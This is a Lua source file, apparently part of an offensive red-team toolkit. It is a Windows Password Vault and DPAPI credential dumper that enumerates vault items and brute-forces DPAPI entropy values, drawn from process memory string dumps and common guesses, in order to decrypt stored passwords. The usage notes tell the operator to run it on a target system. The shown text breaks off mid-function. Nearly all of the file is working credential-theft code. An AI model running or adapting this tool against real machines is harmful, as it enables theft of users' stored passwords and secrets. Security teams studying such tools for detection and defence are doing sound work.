--[[
    vaultdump-dataprotectionexploit.lua - Windows Password Vault & DPAPI Credential Dumper with Entropy Brute-Force
    Extracts and decrypts credentials from Windows Password Vault and DPAPI with entropy brute-forcing

    Uses FFI to interface with Windows SDK APIs and System.Security.Cryptography.ProtectedData for DPAPI with entropy
    to unlock and decrypt ProtectedData via brute-force. 
    
    DESIGNED FOR: System.Security.Cryptography.ProtectedData.dll

    This tool is specifically designed to unlock data encrypted with System.Security.Cryptography.ProtectedData
    by brute-forcing entropy values from memory string dumps. Supports base64-encoded Password fields.
    
    USAGE:
        1. Generate String Dump (run on target system):
           .\OffensiveLuaEmbedded.exe memorysearch_stringdump.lua
           Output: C:\Windows\Temp\MACHINENAME_STRINGDUMP_PID_TIMESTAMP.txt
        
        2. Configure Entropy List Path:
           CONFIG.ENTROPY_LIST_FILE = "C:\\Windows\\Temp\\WIN11LAB_STRINGDUMP_PID35164_20251016_114118.txt"
           
           File format (both supported):
           - String dump format: 0x00007FF123456789: my_entropy_string
           - Plain format: my_entropy_string
        
        3. Run DPAPI Vault Dump:
           .\OffensiveLuaEmbedded.exe vaultdump-dataprotectionexploit.lua
           
           The tool will:
           - Try each entropy value from the file
           - STOP on first successful decryption for each blob
           - Display successful entropy on screen
           - Log successful attempts and failed attempts (if DEBUG_DPAPI is enabled)
        
        4. Optional - Auto-Try Common Values:
           CONFIG.AUTO_TRY_COMMON = true
           Automatically tries: MACHINE_NAME, PROCESS_NAME, USERNAME first
        
        5. Advanced:
           - All entropy strings are used as-is with UTF-8 encoding (like Encoding.UTF8.GetBytes())
           - Stops on first successful decryption per blob (efficient brute-force)
           - Successful entropy values are tracked and displayed at the end
    
    NOTES:
        - This version is designed for brute-forcing entropy values
        - All vault byte arrays (type 6) and protected strings (type 7) will be unlocked
        - Base64-encoded DPAPI blobs are automatically detected and decoded before decryption.
]]

local ffi = require("ffi")

-- Disable JIT when running in injected context
if jit then
    jit.off()   -- Disable JIT compiler globally
    jit.flush() -- Flush any existing JIT compiled code
end

-- Configuration
local CONFIG = {
    VERBOSE = true,
    DUMP_HEX = true,
    EXPORT_FILE = nil,  -- Set to filename to export results
    INCLUDE_SYSTEM = true,
    MAX_CREDENTIAL_SIZE = 64 * 1024,
    DEBUG_DPAPI = false,  -- Set to false to reduce screen clutter
    SEARCH_VCRD = true,
    DECODE_BASE64 = true,
    HEXDUMP_WIDTH = 16,
    
    -- ===== PASSWORD BASE64 DECODING =====
    -- If true, Password fields will be base64-decoded before attempting DPAPI unlock
    DECODE_PASSWORD_BASE64 = true,  -- Set to false to skip base64 decoding
    
    -- ===== TARGETED RESOURCE ATTACK =====
    -- Specify a target resource name to perform unlock() attack only on that resource
    -- If the resource is not found, performs normal vault dump without unlock attacks
    -- Set to nil to perform unlock attacks on all resources
    -- Example: "somecred" or "https://somewebsite"
    TARGET_RESOURCE = nil,  -- Set to nil to attack all resources, or specify target
    
    -- ===== ENTROPY CONFIGURATION =====
    -- Set this to your entropy value (UTF-8 string or base64-encoded bytes)
    -- Examples:
    --   ENTROPY_STRING = "password"                  -- Plain UTF-8 string
    --   ENTROPY_STRING = nil                         -- Use entropy list file from string dump
    ENTROPY_STRING = nil,  -- Set to nil to use entropy list file
    
    -- Path to entropy list file (typically from memorysearch_stringdump.lua output)
    -- Format: Each line should be "ADDRESS: STRING" or just "STRING"
    -- Example: C:\Windows\Temp\WIN11LAB_STRINGDUMP_PID35164_20251016_114118.txt
    ENTROPY_LIST_FILE = "C:/Users/Fantastic/Desktop/DEMO/plugins/OffensiveLua/entropy.list",  -- REQUIRED: Set to actual path
    
    -- Auto-try common entropy values (machine name, process name, user SID)
    AUTO_TRY_COMMON = true,
    
    -- If true, will also try decryption WITHOUT entropy as fallback (not recommended for this version)
    FALLBACK_NO_ENTROPY = false,
}

-- Global log file handle (single consolidated log)
local LOG_FILE = nil
local LOG_PATH = nil

-- Global statistics
local ATTACK_STATS = {
    resources_targeted = 0,  -- Count of resources that matched TARGET_RESOURCE filter
    resources_attacked = 0,  -- Count of resources where we actually attempted DPAPI attack
}

-- Forward declarations for logging functions (will be defined after DLL loading)
local init_logging
local close_logging
local log_entropy_attempt

-- Windows API Constants
local CRED_TYPE_GENERIC = 0x01
local CRED_TYPE_DOMAIN_PASSWORD = 0x02
local CRED_TYPE_DOMAIN_CERTIFICATE = 0x03
local CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 0x04
local CRED_TYPE_GENERIC_CERTIFICATE = 0x05
local CRED_TYPE_DOMAIN_EXTENDED = 0x06
local CRED_TYPE_MAXIMUM = 0x07

local CRED_PERSIST_SESSION = 0x01
local CRED_PERSIST_LOCAL_MACHINE = 0x02
local CRED_PERSIST_ENTERPRISE = 0x03

local CRYPTPROTECT_UI_FORBIDDEN = 0x01
local CRYPTPROTECT_LOCAL_MACHINE = 0x04
local CRYPTPROTECT_AUDIT = 0x10

-- Common DPAPI error codes
local ERROR_INVALID_DATA = 13  -- 0xD - The data is invalid
local ERROR_INVALID_PARAMETER = 87  -- 0x57 - The parameter is incorrect
local NTE_BAD_DATA = 0x80090005  -- Bad Data (wrong entropy, wrong user context, etc.)
local NTE_BAD_KEY = 0x80090003  -- Bad Key
local ERROR_NOT_SUPPORTED = 0x80070032  -- The request is not supported
local ERROR_SUCCESS = 0

-- Windows API Definitions
ffi.cdef[[
    typedef unsigned long DWORD;
    typedef unsigned short WORD;
    typedef unsigned char BYTE;
    typedef void* PVOID;
    typedef void* HANDLE;
    typedef const void* LPCVOID;
    typedef wchar_t WCHAR;
    typedef char CHAR;
    typedef int BOOL;
    typedef const WCHAR* LPCWSTR;
    typedef WCHAR* LPWSTR;
    typedef const CHAR* LPCSTR;
    typedef CHAR* LPSTR;
    typedef DWORD* LPDWORD;
    
    typedef struct _FILETIME {
        DWORD dwLowDateTime;
        DWORD dwHighDateTime;
    } FILETIME;
    
    typedef struct _GUID {
        DWORD Data1;
        WORD Data2;
        WORD Data3;
        BYTE Data4[8];
    } GUID;
    
    typedef struct _CREDENTIAL_ATTRIBUTEW {
        LPWSTR Keyword;
        DWORD  Flags;
        DWORD  ValueSize;
        BYTE*  Value;
    } CREDENTIAL_ATTRIBUTEW;
    
    typedef struct _CREDENTIALW {
        DWORD Flags;
        DWORD Type;
        LPWSTR TargetName;
        LPWSTR Comment;
        FILETIME LastWritten;
        DWORD CredentialBlobSize;
        BYTE* CredentialBlob;
        DWORD Persist;
        DWORD AttributeCount;
        CREDENTIAL_ATTRIBUTEW* Attributes;
        LPWSTR TargetAlias;
        LPWSTR UserName;
    } CREDENTIALW, *PCREDENTIALW;
    
    typedef struct _DATA_BLOB {
        DWORD cbData;
        BYTE* pbData;
    } DATA_BLOB;
    
    typedef struct _CRYPTPROTECT_PROMPTSTRUCT {
        DWORD cbSize;
        DWORD dwPromptFlags;
        HANDLE hwndApp;
        LPCWSTR szPrompt;
    } CRYPTPROTECT_PROMPTSTRUCT;
    
    // Credential Manager APIs
    BOOL CredEnumerateW(
        LPCWSTR Filter,
        DWORD Flags,
        DWORD* Count,
        PCREDENTIALW** Credentials
    );
    
    void CredFree(PVOID Buffer);
    
    BOOL CredReadW(
        LPCWSTR TargetName,
        DWORD Type,
        DWORD Flags,
        PCREDENTIALW* Credential
    );
    
    // DPAPI Functions
    BOOL CryptUnprotectData(
        DATA_BLOB* pDataIn,
        LPWSTR* ppszDataDescr,
        DATA_BLOB* pOptionalEntropy,
        PVOID pvReserved,
        CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct,
        DWORD dwFlags,
        DATA_BLOB* pDataOut
    );
    
    BOOL CryptProtectData(
        DATA_BLOB* pDataIn,
        LPCWSTR szDataDescr,
        DATA_BLOB* pOptionalEntropy,
        PVOID pvReserved,
        CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct,
        DWORD dwFlags,
        DATA_BLOB* pDataOut
    );
    
    // Memory management
    void* LocalFree(void* hMem);
    void* LocalAlloc(DWORD uFlags, size_t uBytes);
    
    // SID conversion
    BOOL ConvertSidToStringSidW(
        void* Sid,
        LPWSTR* StringSid
    );
    
    // String conversion
    int WideCharToMultiByte(
        unsigned int CodePage,
        DWORD dwFlags,
        LPCWSTR lpWideCharStr,
        int cchWideChar,
        LPSTR lpMultiByteStr,
        int cbMultiByte,
        LPCSTR lpDefaultChar,
        BOOL* lpUsedDefaultChar
    );
    
    int MultiByteToWideChar(
        unsigned int CodePage,
        DWORD dwFlags,
        LPCSTR lpMultiByteStr,
        int cbMultiByte,
        LPWSTR lpWideCharStr,
        int cchWideChar
    );
    
    // Vault APIs
    DWORD VaultEnumerateVaults(
        DWORD dwFlags,
        DWORD* pdwVaultsCount,
        void*** ppVaultGuids
    );
    
    DWORD VaultOpenVault(
        const void* pVaultGuid,
        DWORD dwFlags,
        void** ppVault
    );
    
    DWORD VaultCloseVault(
        void* pVault
    );
    
    DWORD VaultEnumerateItems(
        void* pVault,
        DWORD dwFlags,
        DWORD* pdwItemsCount,
        void** ppItems
    );
    
    DWORD VaultGetItem(
        void* pVault,
        const void* pSchemaId,
        void* pResource,
        void* pIdentity,
        void* pPackageSid,
        HANDLE hwndOwner,
        DWORD dwFlags,
        void** ppItem
    );
    
    DWORD VaultFree(
        void* pMemory);
    
    // Vault Item Structures
    typedef struct _VAULT_ITEM_DATA {
        DWORD dwType;
        DWORD unknown1;
        union {
            struct {
                DWORD length;
                LPWSTR string;
            } string_data;
            struct {
                DWORD length;
                BYTE* data;
            } byte_array;
            DWORD dword_data;
            BOOL bool_data;
            GUID guid_data;
            struct {
                LPWSTR string;
            } protected_string;  /* For type 7 */
            void* sid;  /* For type 8 (SID pointer) */
        };
    } VAULT_ITEM_DATA;
    
    typedef struct _VAULT_ITEM_ELEMENT {
        DWORD schemaElementId;
        DWORD unknown1;
        VAULT_ITEM_DATA data;
    } VAULT_ITEM_ELEMENT;
    
    typedef struct _VAULT_ITEM_7 {
        GUID schemaId;
        LPWSTR friendlyName;
        VAULT_ITEM_ELEMENT* pResourceElement;
        VAULT_ITEM_ELEMENT* pIdentityElement;
        VAULT_ITEM_ELEMENT* pAuthenticatorElement;
        FILETIME lastWritten;
        DWORD dwFlags;
        DWORD dwPropertiesCount;
        VAULT_ITEM_ELEMENT* pProperties;
    } VAULT_ITEM_7;
    
    typedef struct _VAULT_ITEM_8 {
        GUID schemaId;
        LPWSTR friendlyName;
        VAULT_ITEM_ELEMENT* pResourceElement;
        VAULT_ITEM_ELEMENT* pIdentityElement;
        VAULT_ITEM_ELEMENT* pAuthenticatorElement;
        VAULT_ITEM_ELEMENT* pPackageSid;
        FILETIME lastWritten;
        DWORD dwFlags;
        DWORD dwPropertiesCount;
        VAULT_ITEM_ELEMENT* pProperties;
    } VAULT_ITEM_8;
    
    // Additional Windows APIs
    DWORD GetLastError();
    
    DWORD GetEnvironmentVariableA(
        LPCSTR lpName,
        LPSTR lpBuffer,
        DWORD nSize
    );
    
    DWORD GetComputerNameA(
        LPSTR lpBuffer,
        LPDWORD nSize
    );
    
    DWORD GetCurrentProcessId();
    
    HANDLE GetCurrentProcess();
    
    HANDLE OpenProcess(
        DWORD dwDesiredAccess,
        BOOL bInheritHandle,
        DWORD dwProcessId
    );
    
    BOOL CloseHandle(HANDLE hObject);
    
    BOOL GetUserNameA(
        LPSTR lpBuffer,
        LPDWORD pcbBuffer
    );
    
    HANDLE GetCurrentThread();
    
    BOOL OpenProcessToken(
        HANDLE ProcessHandle,
        DWORD DesiredAccess,
        HANDLE* TokenHandle
    );
    
    BOOL GetTokenInformation(
        HANDLE TokenHandle,
        DWORD TokenInformationClass,
        void* TokenInformation,
        DWORD TokenInformationLength,
        DWORD* ReturnLength
    );
    
    typedef struct _SID_AND_ATTRIBUTES {
        void* Sid;
        DWORD Attributes;
    } SID_AND_ATTRIBUTES;
    
    typedef struct _TOKEN_USER {
        SID_AND_ATTRIBUTES User;
    } TOKEN_USER;
    
    BOOL ConvertSidToStringSidA(
        void* Sid,
        LPSTR* StringSid
    );
    
    DWORD GetModuleFileNameA(
        HANDLE hModule,
        LPSTR lpFilename,
        DWORD nSize
    );
    
    // File operations
    HANDLE CreateFileA(
        LPCSTR lpFileName,
        DWORD dwDesiredAccess,
        DWORD dwShareMode,
        void* lpSecurityAttributes,
        DWORD dwCreationDisposition,
        DWORD dwFlagsAndAttributes,
        HANDLE hTemplateFile
    );
    
    BOOL ReadFile(
        HANDLE hFile,
        void* lpBuffer,
        DWORD nNumberOfBytesToRead,
        LPDWORD lpNumberOfBytesRead,
        void* lpOverlapped
    );
    
    DWORD GetFileSize(
        HANDLE hFile,
        LPDWORD lpFileSizeHigh
    );
    
    typedef struct _WIN32_FIND_DATAA {
        DWORD dwFileAttributes;
        FILETIME ftCreationTime;
        FILETIME ftLastAccessTime;
        FILETIME ftLastWriteTime;
        DWORD nFileSizeHigh;
        DWORD nFileSizeLow;
        DWORD dwReserved0;
        DWORD dwReserved1;
        CHAR cFileName[260];
        CHAR cAlternateFileName[14];
    } WIN32_FIND_DATAA;
    
    HANDLE FindFirstFileA(
        LPCSTR lpFileName,
        WIN32_FIND_DATAA* lpFindFileData
    );
    
    BOOL FindNextFileA(
        HANDLE hFindFile,
        WIN32_FIND_DATAA* lpFindFileData
    );
    
    BOOL FindClose(HANDLE hFindFile);
]]

-- Load Windows DLLs
local advapi32 = ffi.load("Advapi32.dll")
local crypt32 = ffi.load("Crypt32.dll")
local kernel32 = ffi.load("kernel32.dll")
local vaultcli = ffi.load("vaultcli.dll")

-- File operation constants
local GENERIC_READ = 0x80000000
local FILE_SHARE_READ = 0x00000001
local OPEN_EXISTING = 3
local FILE_ATTRIBUTE_NORMAL = 0x80
local INVALID_HANDLE_VALUE = ffi.cast("HANDLE", -1)

-- Global entropy list
local ENTROPY_VALUES = {}
local COMMON_ENTROPY_VALUES = {}
local SUCCESSFUL_ENTROPY_VALUES = {}  -- Track which entropy values worked

-- Helper Functions

local function log(msg)
    if LOG_FILE then
        LOG_FILE:write(msg .. "\n")
        LOG_FILE:flush()
    end
    if CONFIG.VERBOSE then
        print(msg)
    end
end

local function debug_log(msg)
    if CONFIG.DEBUG_DPAPI then
        log("[DEBUG] " .. msg)
    end
end

-- Function to get current process context for DPAPI troubleshooting
local function log_process_context()
    log("\n[*] Process Context Information (for DPAPI troubleshooting):")
    
    -- Current Process ID
    local pid = kernel32.GetCurrentProcessId()
    log(string.format("    Process ID: %d", pid))
    
    -- Current Process Name
    local proc_name = ffi.new("char[260]")
    local name_len = kernel32.GetModuleFileNameA(nil, proc_name, 260)
    if name_len > 0 then
        local full_path = ffi.string(proc_name)
        local name_only = full_path:match("([^\\]+)$") or full_path
        log(string.format("    Process Name: %s", name_only))
        log(string.format("    Process Path: %s", full_path))
    end
    
    -- Current Username (GetUserNameA is in advapi32.dll)
    local username = ffi.new("char[260]")
    local username_len = ffi.new("DWORD[1]", 260)
    if advapi32.GetUserNameA(username, username_len) ~= 0 then
        log(string.format("    Username: %s", ffi.string(username)))
    end
    
    -- Current User SID
    pcall(function()
        local TOKEN_QUERY = 0x0008
        local TokenUser = 1
        local token = ffi.new("HANDLE[1]")
        
        if advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_QUERY, token) ~= 0 then
            local size = ffi.new("DWORD[1]")
            advapi32.GetTokenInformation(token[0], TokenUser, nil, 0, size)
            
            if size[0] > 0 then
                local buffer = ffi.new("uint8_t[?]", size[0])
                if advapi32.GetTokenInformation(token[0], TokenUser, buffer, size[0], size) ~= 0 then
                    local token_user = ffi.cast("TOKEN_USER*", buffer)
                    local sid_string = ffi.new("LPSTR[1]")
                    
                    if advapi32.ConvertSidToStringSidA(token_user.User.Sid, sid_string) ~= 0 then
                        log(string.format("    User SID: %s", ffi.string(sid_string[0])))
                        ffi.C.LocalFree(sid_string[0])
                    end
                end
            end
            
            kernel32.CloseHandle(token[0])
        end
    end)
    
    -- Computer Name
    local computer = ffi.new("char[260]")
    local comp_size = ffi.new("DWORD[1]", 260)
    if kernel32.GetComputerNameA(computer, comp_size) ~= 0 then
        log(string.format("    Computer: %s", ffi.string(computer)))
    end
    
    log("")
end

-- Define logging functions (now that DLLs are loaded)
init_logging = function()
    -- Get %TEMP% directory
    local temp = os.getenv("TEMP") or os.getenv("TMP") or "C:\\Temp"
    
    -- Get machine name
    local machine_name = "UNKNOWN"
    local machine_buf = ffi.new("char[256]")
    local machine_size = ffi.new("DWORD[1]", 256)
    if kernel32.GetComputerNameA(machine_buf, machine_size) ~= 0 then
        machine_name = ffi.string(machine_buf)
    end
    
    -- Get username
    local username = "UNKNOWN"
    local user_buf = ffi.new("char[256]")
    local user_size = ffi.new("DWORD[1]", 256)
    if advapi32.GetUserNameA(user_buf, user_size) ~= 0 then
        username = ffi.string(user_buf)
    end
    
    -- Get PID
    local pid = kernel32.GetCurrentProcessId()
    
    -- Get process name (without .exe extension)
    local process_name = "OffensiveLuaEmbedded"
    local proc_buf = ffi.new("char[260]")
    local proc_len = kernel32.GetModuleFileNameA(nil, proc_buf, 260)
    if proc_len > 0 then
        local full_path = ffi.string(proc_buf)
        local name_only = full_path:match("([^\\]+)$") or full_path
        process_name = name_only:match("(.+)%.exe$") or name_only
    end
    
    -- Get timestamp
    local timestamp = os.date("%Y%m%d_%H%M%S")
    
    -- Build filename: MACHINENAME_USERNAME_PID_PROCESSNAME_VAULTDUMP_TIMESTAMP.log
    LOG_PATH = string.format("%s\\%s_%s_%d_%s_VAULTDUMP_%s.log", 
        temp, machine_name, username, pid, process_name, timestamp)
    
    LOG_FILE = io.open(LOG_PATH, "w")
    
    if not LOG_FILE then
        print(string.format("[!] ERROR: Could not create log file at %s", LOG_PATH))
        return false
    end
    
    -- Write header
    LOG_FILE:write(string.rep("=", 80) .. "\n")
    LOG_FILE:write("Windows Password Vault Dump with DPAPI Entropy Brute-Force\n")
    LOG_FILE:write(string.rep("=", 80) .. "\n")
    LOG_FILE:write(string.format("Date: %s\n", os.date("%Y-%m-%d %H:%M:%S")))
    LOG_FILE:write(string.format("Log File: %s\n", LOG_PATH))
    LOG_FILE:write(string.rep("=", 80) .. "\n\n")
    LOG_FILE:flush()
    
    return true
end

close_logging = function()
    if LOG_FILE then
        LOG_FILE:write("\n" .. string.rep("=", 80) .. "\n")
        LOG_FILE:write(string.format("Completed: %s\n", os.date("%Y-%m-%d %H:%M:%S")))
        LOG_FILE:write(string.rep("=", 80) .. "\n")
        LOG_FILE:close()
        LOG_FILE = nil
    end
end

log_entropy_attempt = function(entropy_value, entropy_source, blob_label, success, error_code)
    if not LOG_FILE then return end
    
    local timestamp = os.date("%H:%M:%S")
    local status = success and "SUCCESS" or "FAILED"
    local entropy_display = entropy_value
    if #entropy_display > 100 then
        entropy_display = entropy_display:sub(1, 100) .. "..."
    end
    
    -- Only log failed attempts if DEBUG_DPAPI is enabled
    -- Always log successful attempts
    if not success and not CONFIG.DEBUG_DPAPI then
        return
    end
    
    local msg = string.format("[%s] ENTROPY ATTEMPT - %s | Blob: '%s' | Source: %s | Entropy: '%s'",
        timestamp, status, blob_label or "unknown", entropy_source, entropy_display)
    
    if not success and error_code then
        msg = msg .. string.format(" | Error: 0x%08X", error_code)
    end
    
    LOG_FILE:write(msg .. "\n")
    LOG_FILE:flush()
end

-- Get common entropy values
local function get_common_entropy_values()
    local common = {}
    
    -- Machine name
    local machine_name_buf = ffi.new("char[256]")
    local machine_name_size = ffi.new("DWORD[1]", 256)
    if kernel32.GetComputerNameA(machine_name_buf, machine_name_size) ~= 0 then
        local machine_name = ffi.string(machine_name_buf)
        table.insert(common, {value = machine_name, source = "MACHINE_NAME"})
        debug_log(string.format("Common entropy: MACHINE_NAME = '%s'", machine_name))
    end
    
    -- Current process name (without .exe)
    local process_name = arg and arg[0] or "OffensiveLuaEmbedded"
    process_name = process_name:match("([^/\\]+)%.exe$") or process_name:match("([^/\\]+)$") or process_name
    table.insert(common, {value = process_name, source = "PROCESS_NAME"})
    debug_log(string.format("Common entropy: PROCESS_NAME = '%s'", process_name))
    
    -- User SID (requires token APIs)
    -- For now, we'll try to get it via environment or registry
    -- This is a simplified approach - real SID would need OpenProcessToken + GetTokenInformation
    local username = os.getenv("USERNAME") or "User"
    table.insert(common, {value = username, source = "USERNAME"})
    debug_log(string.format("Common entropy: USERNAME = '%s'", username))
    
    -- Try some other common patterns
    table.insert(common, {value = "password", source = "COMMON_password"})
    table.insert(common, {value = "entropy", source = "COMMON_entropy"})
    table.insert(common, {value = "key", source = "COMMON_key"})
    table.insert(common, {value = "secret", source = "COMMON_secret"})
    
    return common
end

-- Load entropy values from file (supports string dump format)
local function load_entropy_list(filepath)
    local values = {}
    
    if not filepath then
        debug_log("No entropy list file specified")
        return values
    end
    
    local file = io.open(filepath, "r")
    if not file then
        log(string.format("[!] ERROR: Could not open entropy list file: %s", filepath))
        log("[!] Make sure the file path is correct and accessible")
        return values
    end
    
    log(string.format("[*] Entropy file opened: %s", filepath))
    log("[*] Entropy values will be loaded on-demand during brute-force")
    
    file:close()
    
    -- Return a marker that indicates we should use lazy loading
    return {__lazy_load = true, filepath = filepath}
end

-- Iterator function to read entropy values one at a time
local function iterate_entropy_values()
    local index = 0
    local file_handle = nil
    local file_line_num = 0
    
    -- Return iterator function
    return function()
        index = index + 1
        
        -- First, return common entropy values if enabled
        if index <= #COMMON_ENTROPY_VALUES then
            return COMMON_ENTROPY_VALUES[index]
        end
        
        -- Then, lazy-load from file
        if ENTROPY_VALUES.__lazy_load then
            if not file_handle then
                file_handle = io.open(ENTROPY_VALUES.filepath, "r")
                if not file_handle then
                    return nil
                end
            end
            
            while true do
                local line = file_handle:read("*line")
                if not line then
                    file_handle:close()
                    return nil
                end
                
                file_line_num = file_line_num + 1
                
                -- Trim whitespace
                line = line:match("^%s*(.-)%s*$")
                
                -- Skip empty lines and comments
                if line ~= "" and not line:match("^#") then
                    local entropy_string = nil
                    
                    if line:match("^0x%x+:%s*(.+)") then
                        -- String dump format with address
                        entropy_string = line:match("^0x%x+:%s*(.+)")
                    elseif not line:match("^//") then
                        -- Plain string format
                        entropy_string = line
                    end
                    
                    if entropy_string and #entropy_string >= 5 then
                        return {value = entropy_string, source = string.format("FILE:L%d", file_line_num)}
                    end
                end
            end
        end
        
        return nil
    end
end

-- Initialize entropy values
local function init_entropy_values()
    ENTROPY_VALUES = {}
    
    -- Add single entropy value if specified
    if CONFIG.ENTROPY_STRING and CONFIG.ENTROPY_STRING ~= "" then
        -- Use string as-is with UTF-8 encoding (like Encoding.UTF8.GetBytes())
        table.insert(ENTROPY_VALUES, {value = CONFIG.ENTROPY_STRING, source = "CONFIG"})
        debug_log(string.format("Using entropy from config: '%s' (%d bytes)", CONFIG.ENTROPY_STRING, #CONFIG.ENTROPY_STRING))
    end
    
    -- Store common entropy values separately
    if CONFIG.AUTO_TRY_COMMON then
        COMMON_ENTROPY_VALUES = get_common_entropy_values()
        log(string.format("[*] Will try %d common entropy values first", #COMMON_ENTROPY_VALUES))
    end
    
    -- Load entropy list file (lazy loading)
    if CONFIG.ENTROPY_LIST_FILE then
        ENTROPY_VALUES = load_entropy_list(CONFIG.ENTROPY_LIST_FILE)
        if not ENTROPY_VALUES or not ENTROPY_VALUES.__lazy_load then
            log("[!] Failed to set up entropy file for lazy loading")
        end
    end
end

local function init_log()
    -- This function is deprecated - now using init_logging() instead
    -- Kept for backward compatibility but does nothing
    log("[*] Using consolidated logging in %TEMP%")
end

-- Create entropy DATA_BLOB from string
local function create_entropy_blob(entropy_str)
    if not entropy_str or entropy_str == "" then
        debug_log("No entropy specified")
        return nil
    end
    
    -- Convert string to UTF-8 bytes
    local entropy_len = #entropy_str
    
    debug_log(string.format("Creating entropy blob: length=%d", entropy_len))
    
    -- Allocate memory for entropy bytes
    local entropy_data = ffi.new("uint8_t[?]", entropy_len)
    for i = 1, entropy_len do
        entropy_data[i-1] = entropy_str:byte(i)
    end
    
    -- Create DATA_BLOB
    local entropy_blob = ffi.new("DATA_BLOB")
    entropy_blob.cbData = entropy_len
    entropy_blob.pbData = entropy_data
    
    return entropy_blob, entropy_data  -- Return both to keep data alive
end

-- Utility Functions
local function wstring_to_string(wstr)
    if wstr == nil or wstr == ffi.NULL then
        return nil
    end
    
    local CP_UTF8 = 65001
    local len = ffi.C.WideCharToMultiByte(CP_UTF8, 0, wstr, -1, nil, 0, nil, nil)
    if len <= 0 then
        return nil
    end
    
    local buf = ffi.new("char[?]", len)
    ffi.C.WideCharToMultiByte(CP_UTF8, 0, wstr, -1, buf, len, nil, nil)
    return ffi.string(buf)
end

local function string_to_wstring(str)
    if not str then
        return nil
    end
    
    local CP_UTF8 = 65001
    local len = ffi.C.MultiByteToWideChar(CP_UTF8, 0, str, -1, nil, 0)
    if len <= 0 then
        return nil
    end
    
    local wbuf = ffi.new("WCHAR[?]", len)
    ffi.C.MultiByteToWideChar(CP_UTF8, 0, str, -1, wbuf, len)
    return wbuf
end

local function bytes_to_hex(data, size)
    local hex = {}
    for i = 0, size - 1 do
        table.insert(hex, string.format("%02X", data[i]))
    end
    return table.concat(hex, " ")
end

local function is_printable(data, size)
    local printable_count = 0
    local null_count = 0
    
    for i = 0, size - 1 do
        local byte = data[i]
        if byte == 0 then
            null_count = null_count + 1
        elseif byte >= 32 and byte <= 126 then
            printable_count = printable_count + 1
        end
    end
    
    -- Consider printable if >70% printable chars (excluding nulls)
    local non_null = size - null_count
    return non_null > 0 and (printable_count / non_null) > 0.7
end

local function hexdump(data, size)
    if size > CONFIG.HEXDUMP_WIDTH * 8 then
        size = CONFIG.HEXDUMP_WIDTH * 8  -- Limit to 8 lines
    end
    
    local lines = {}
    for i = 0, size - 1, CONFIG.HEXDUMP_WIDTH do
        local hex_part = {}
        local ascii_part = {}
        
        for j = 0, CONFIG.HEXDUMP_WIDTH - 1 do
            if i + j < size then
                local byte = data[i + j]
                table.insert(hex_part, string.format("%02X", byte))
                
                if byte >= 32 and byte <= 126 then
                    table.insert(ascii_part, string.char(byte))
                else
                    table.insert(ascii_part, ".")
                end
            end
        end
        
        table.insert(lines, string.format("%08X: %s | %s", i, table.concat(hex_part, " "), table.concat(ascii_part)))
    end
    
    return table.concat(lines, "\n")
end

-- Base64 detection
local function is_base64(str)
    if not str or #str == 0 then return false end
    if #str % 4 ~= 0 then return false end
    return str:match("^[A-Za-z0-9+/]*=*$") ~= nil
end

-- Base64 decoder
local function decode_base64(str)
    if not str then return nil end
    
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local b64lookup = {}
    for i = 1, #b64chars do
        b64lookup[b64chars:sub(i, i)] = i - 1
    end
    b64lookup['='] = 0
    
    local result = {}
    local padding = 0
    
    for chunk in str:gmatch('....') do
        if #chunk ~= 4 then break end
        
        local n = 0
        local chars_in_chunk = 0
        
        for i = 1, 4 do
            local c = chunk:sub(i, i)
            if c == '=' then
                padding = padding + 1
            else
                local val = b64lookup[c]
                if val then
                    n = n * 64 + val
                    chars_in_chunk = chars_in_chunk + 1
                else
                    return nil
                end
            end
        end
        
        n = n * (64 ^ (4 - chars_in_chunk - padding))
        
        table.insert(result, string.char(math.floor(n / 65536) % 256))
        if padding < 2 then
            table.insert(result, string.char(math.floor(n / 256) % 256))
        end
        if padding < 1 then
            table.insert(result, string.char(n % 256))
        end
    end
    
    return table.concat(result)
end

-- DPAPI Decryption with specific entropy value
local function dpapi_decrypt_with_entropy(encrypted_data, data_size, entropy_str, entropy_source, blob_label)
    -- Input data blob
    local data_in = ffi.new("DATA_BLOB")
    data_in.cbData = data_size
    data_in.pbData = encrypted_data
    
    -- Output data blob
    local data_out = ffi.new("DATA_BLOB")
    
    -- Optional description
    local descr = ffi.new("LPWSTR[1]")
    descr[0] = nil
    
    -- Create entropy blob
    local entropy_blob, entropy_data_keeper = create_entropy_blob(entropy_str)
    if not entropy_blob then
        return nil, nil
    end
    
    -- Attempt decryption
    local result = crypt32.CryptUnprotectData(
        data_in,
        descr,
        entropy_blob,
        nil,
        nil,
        CRYPTPROTECT_UI_FORBIDDEN,
        data_out
    )
    
    if result == 0 then
        local err = kernel32.GetLastError()
        -- Log failed attempt
        log_entropy_attempt(entropy_str, entropy_source, blob_label, false, err)
        return nil, nil
    end
    
    -- Extract decrypted data
    local decrypted = ffi.string(data_out.pbData, data_out.cbData)
    
    -- Extract description if present
    local description = nil
    if descr[0] ~= nil and descr[0] ~= ffi.NULL then
        description = wstring_to_string(descr[0])
        kernel32.LocalFree(descr[0])
    end
    
    -- Free the output buffer
    kernel32.LocalFree(data_out.pbData)
    
    -- Log successful attempt
    log_entropy_attempt(entropy_str, entropy_source, blob_label, true, nil)
    
    return decrypted, description
end

-- Helper function to get table length (for hash tables)
local function table_length(t)
    local count = 0
    for _ in pairs(t) do
        count = count + 1
    end
    return count
end

-- Main DPAPI decryption wrapper - tries all entropy values
local function dpapi_decrypt(encrypted_data, data_size, label)
    label = label or "unknown"
    
    -- Log brute-force start
    log(string.format("\n[*] Starting entropy brute-force for '%s' (%d bytes)", label, data_size))
    
    local attempt_count = 0
    local last_progress_time = os.time()
    
    -- OPTIMIZATION: Try previously successful entropy values FIRST
    if next(SUCCESSFUL_ENTROPY_VALUES) then
        log(string.format("[*] Trying %d previously successful entropy values first...", 
            table_length(SUCCESSFUL_ENTROPY_VALUES)))
        
        for key, entropy_info in pairs(SUCCESSFUL_ENTROPY_VALUES) do
            attempt_count = attempt_count + 1
            
            local decrypted, descr = dpapi_decrypt_with_entropy(
                encrypted_data, 
                data_size, 
                entropy_info.value,
                entropy_info.source,
                label
            )
            
            if decrypted then
                entropy_info.count = entropy_info.count + 1
                
                print(string.format("\n[SUCCESS] Decrypted '%s' using previously successful entropy (attempt %d)", 
